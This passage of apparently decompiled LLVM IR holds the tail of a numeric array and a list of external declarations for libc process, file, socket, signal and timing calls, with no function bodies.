298, 299, 300, 301, 11, 302, 303, 304, 116, 117, 118, 119, 120, 121, 122, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 133, 134, 135, 136, 141, 142, 143, 144, 145, 146, 160, 161, 162, 165, 166, 167, 8, 168, 2, 169, 39, 40, 41, 42, 127, 128, 129, 130, 131, 132, 123, 124, 125, 126, 43, 44, 45, 46, 47, 137, 138, 139, 140, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 170, 171, 172, 173, 174, 163, 164, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 200, 201, 202, 203, 204, 205, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 13, 327 }
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

attributes #0 = { noreturn }
